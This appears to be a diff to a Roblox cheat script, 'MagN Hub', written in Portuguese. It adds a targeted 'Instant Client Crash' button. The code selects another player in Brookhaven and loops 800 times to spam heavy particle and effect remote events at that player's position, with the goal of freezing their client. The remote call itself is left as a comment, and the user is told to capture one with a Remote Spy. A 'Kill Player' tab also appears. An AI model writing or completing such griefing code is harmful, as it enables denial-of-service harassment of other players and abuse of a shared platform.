@@ -724,6 +724,53 @@ BossScript:AddToggle({
     end
 })
 
+-- Redz Library - Variáveis para o Instant Client Crash do MagN Hub
+local Players = game:GetService("Players")
+local targetName = "" -- Armazena o alvo selecionado nos menus anteriores
+
+-- Dropdown para selecionar o Alvo (Unificado com seu sistema)
+local TargetDropdownCrash = BossScript:AddDropdown({
+    Name = "Alvo do Instant Crash",
+    Options = {}, -- Preenchido dinamicamente com os nicks do servidor
+    Default = "Nenhum",
+    Callback = function(selectedOption)
+        targetName = selectedOption
+    end
+})
+
+-- Botão de Execução de Crash Direcionado
+BossScript:AddButton({
+    Name = "💥 Executar Instant Client Crash",
+    Callback = function()
+        local target = Players:FindFirstChild(targetName)
+        
+        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
+            print("[MagN Hub]: Alvo inválido ou fora do alcance.")
+            return
+        end
+        
+        print("[MagN Hub]: Enviando carga destrutiva de memória para " .. target.Name)
+        
+        -- Pega a coordenada exata da cabeça/câmera do alvo
+        local targetCFrame = target.Character.HumanoidRootPart.CFrame
+        
+        -- LOOP ULTRA RÁPIDO (Sem task.wait para acumular tudo no mesmo frame de renderização)
+        -- Dispara 800 requisições simultâneas de efeitos pesados (Fumaça/Luz/Efeitos de Carro VIP do Brookhaven)
+        for i = 1, 800 do
+            -- NOTA: Use o seu Remote Spy para capturar o evento de um item muito pesado do Brookhaven.
+            -- Exemplos mais eficazes no Brookhaven: 
+            -- 1. O efeito de fumaça preta/fogo de motores de carros batidos.
+            -- 2. Spams do holofote de luz dinâmica do helicóptero ou viatura.
+            -- 3. Spams de partículas de fogueiras sobrepostas.
+            
+            -- Exemplo lógico da chamada do Remote:
+            -- game:GetService("ReplicatedStorage").Caminho.Do.RemoteDeProps:FireServer("ID_Item_Particulas_Pesadas", targetCFrame)
+        end
+        
+        print("[MagN Hub]: Carga enviada! O dispositivo do alvo deve travar em instâncias.")
+    end
+})
+
 local Troll = Window:MakeTab({ Title = "Kill Player", Icon = "rbxassetid://11415789819" })
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
